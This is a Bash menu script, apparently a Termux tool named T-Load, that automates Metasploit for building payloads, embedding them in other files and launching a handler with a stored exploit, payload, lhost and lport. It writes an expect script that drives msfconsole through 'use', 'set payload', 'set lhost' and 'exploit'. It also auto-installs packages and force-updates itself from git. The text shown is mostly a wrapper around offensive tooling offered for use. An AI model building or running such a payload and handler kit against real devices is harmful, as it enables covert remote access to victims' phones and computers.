trap '' INT TSTP
source $HOME/T-Load/host
source $HOME/T-Load/.clr
dir="$HOME/T-Load"
cd $dir
### Auto Setup
clear
chmod +x *
chmod 600 key
OS=$(./.setupcheck openssh)
SP=$(./.setupcheck sshpass)
CU=$(./.setupcheck curl)
RS=$(./.setupcheck rsync)
EX=$(./.setupcheck expect)
if [ "$OS" == "0" ] || [ "$SP" == "0" ] || [ "$CU" == "0" ] || [ "$RS" == "0" ] || [ "$EX" == "0" ]; then
clear
echo -e "$bgy $blWelcome to T-Load. This must be your first use or the required files must have been deleted. So please wait untill all the required files have been setup.$rt"
sleep 8
#Setup
pkg install openssh -y
pkg install sshpass -y
pkg install curl -y
pkg install rsync -y
apt-get install expect -y
[[ -s $HOME/.msf_default/msfload ]]
msfl=$(echo $?)
mkdir $HOME/.msf_default
if [ $msfl = "1" ]
then
echo '#!/data/data/com.termux/files/usr/bin/expect -f
source /data/data/com.termux/files/home/.msf_default/port
source /data/data/com.termux/files/home/.msf_default/host
source /data/data/com.termux/files/home/.msf_default/exploit
source /data/data/com.termux/files/home/.msf_default/payload
spawn msfconsole
expect "msf > "
send "use $exploit \r"
expect "msf exploit(handler) > "
send "set payload $payload \r"
expect "msf exploit(handler) > "
send "set lhost $lhostused \r"
expect "msf exploit(handler) > "
send " set lport $lportused \r"
expect "msf exploit(handler) > "
send "exploit \r"
interact' >> $HOME/.msf_default/msfload
fi
cd $HOME/T-Load
chmod +x $HOME/.msf_default/msfload
chmod +x embed
chmod +x updates
chmod 600 key
chmod +x redownload
touch $HOME/.msf_default/pay
touch $HOME/.msf_default/port
touch $HOME/.msf_default/port
touch $HOME/.msf_default/host
touch $HOME/.msf_default/payload
touch $HOME/.msf_default/exploit
ln -s $HOME/T-Load/tload /data/data/com.termux/files/usr/bin/tload
chmod +x /data/data/com.termux/files/usr/bin/tload
#End Setup
fi
no=$(ls $HOME/.msf_default | wc -l)
if [ ! -d $HOME/.msf_default ] || [ "$no" != "7" ];
then
{
echo -e "$bgy $blWelcome to T-Load. This must be your first use or the required files must have been deleted. So please wait untill all the required files have been setup.$rt"
 sleep 8
 clear
 echo "Setting up things for you. Please wait."
 sleep 3
 #Setup
 clear
 pkg install openssh -y
pkg install sshpass -y
pkg install curl -y
pkg install rsync -y
apt-get install expect -y
[[ -s $HOME/.msf_default/msfload ]]
msfl=$(echo $?)
mkdir $HOME/.msf_default
if [ $msfl = "1" ]
then
echo '#!/data/data/com.termux/files/usr/bin/expect -f
source /data/data/com.termux/files/home/.msf_default/port
source /data/data/com.termux/files/home/.msf_default/host
source /data/data/com.termux/files/home/.msf_default/exploit
source /data/data/com.termux/files/home/.msf_default/payload
spawn msfconsole
expect "msf > "
send "use $exploit \r"
expect "msf exploit(handler) > "
send "set payload $payload \r"
expect "msf exploit(handler) > "
send "set lhost $lhostused \r"
expect "msf exploit(handler) > "
send " set lport $lportused \r"
expect "msf exploit(handler) > "
send "exploit \r"
interact' >> $HOME/.msf_default/msfload
fi
cd $HOME/T-Load
chmod +x $HOME/.msf_default/msfload
chmod +x embed
chmod +x updates
chmod 600 key
chmod +x redownload
touch $HOME/.msf_default/pay
touch $HOME/.msf_default/port
touch $HOME/.msf_default/port
touch $HOME/.msf_default/host
touch $HOME/.msf_default/payload
touch $HOME/.msf_default/exploit
ln -s $HOME/T-Load/tload /data/data/com.termux/files/usr/bin/tload
chmod +x /data/data/com.termux/files/usr/bin/tload
#End Setup
}
fi
## End Auto Setup
#### UPdater
clear
touch updat
rm updat*
git checkout origin/master *
cd $HOME/T-Load
echo -e "$rd $bwt Searching for updates. Please wait :)$rt"
touch $HOME/.msf_default/updates
rm $HOME/.msf_default/updates
git fetch --dry-run 2>&1 > /dev/null| tee $HOME/.msf_default/updates
up=$HOME/.msf_default/updates
if grep -q origin/master "$up"; then
clear
echo -e "$bl $bwt Updates are found. Now updating$rt"
sleep 1
update=$(git fetch --all
git reset --hard origin/master
git pull)
clear
chmod +x *
chmod 600 key
echo -e "$bwt $rd Update done. $bl Restarting$rt"
sleep 2
reload=$(readlink -f "$0")
exec "$reload"
else
chmod +x *
chmod 600 key
echo -e "$rd $bwt No updates $rt"
sleep 2
fi
########Updater end
cd $HOME/T-Load
#
#
## Begin T-Load
clear
if [ "${1}" = "embed" ]
then 
./embed
fi
echo -e "$rd $bcn----------------------------------$rt"
echo -e "$rd $bgy        Version = 7.0.1   $rt "
echo -e "$rd $bcn----------------------------------$rt"
echo -e "$bl $bgy     SCRIPT BY SATHVIK K S      $rt "
echo -e "$rd $bcn----------------------------------$rt"
echo -e "$bwt $bk Select option $rt $rd $bwt"
echo "1. Create Payload"
echo "2. Embed Payload"
echo "3. Launch msfconsole normally"
echo "4. Exit"
echo "5. Set default metasploit exploit to be used"
echo "6. Set default metasploit payload to be used"
echo "7. Set default metasploit lhost  to be used"
echo "8. Set default metasploit lport to be used"
echo "9. Launch msfconsole with default values"
echo "10. Redownload"
echo -e "$rt $bbl"
read -p ">|" o 
echo -e "$rt"
if [ $o = "0" ]
then
./setup
elif [ $o = "10" ]
then
./redownload
elif [ $o = "3" ]
then
clear
cd $metapath
./msfconsole
tload
elif [ $o = "2" ]
then
./embed
elif [ $o = "1" ]
then
./createpayload
elif [ $o = "4" ]
then
clear
exit
elif [ $o = "5" ]
then
rm $HOME/.msf_default/exploit
clear
echo "Enter exploit to be used"
read -p ">|" ex
echo "set exploit \"$ex\"" >> $HOME/.msf_default/exploit
echo "Value stored"
sleep 2
tload
elif [ $o = "6" ]
then
rm $HOME/T-Load/msf_default/payload
clear
echo "Enter payload to be used"
read -p ">|" py
echo "set payload \"$py\"" >> $HOME/.msf_default/payload
echo "Value stored"
sleep 2
tload
elif [ $o = "7" ]
then
rm $HOME/T-Load/msf_default/host
clear
echo "Enter lhost to be used"
read -p ">|" lh
echo "set lhostused \"$lh\"" >> $HOME/.msf_default/host
echo "Value stored"
sleep 2
tload
elif [ $o = "8" ]
then
rm $HOME/.msf_default/port
clear
echo "Enter lport to be used"
read -p ">|" lp
echo "set lportused \"$lp\"" >> $HOME/.msf_default/port
echo "Value stored"
sleep 2
tload
elif [ $o = "9" ]
then
[[ -s $HOME/.msf_default/exploit ]]
exp=$(echo $?)
[[ -s $HOME/.msf_default/payload ]]
pay=$(echo $?)
[[ -s $HOME/.msf_default/host ]]
hos=$(echo $?)
[[ -s $HOME/.msf_default/port ]]
por=$(echo $?)
if [ $exp = $pay ] && [ $hos = $por ] && [ $exp = $hos ] && [ $exp = "0" ]
then
clear
$HOME/.msf_default/msfload
else
clear
tload
echo "One or more of the default values have not been set. Please try again"
sleep 4
tload
fi
else
echo "Wrong choice. Please try again"
sleep 3
tload
fi
# End T-Load
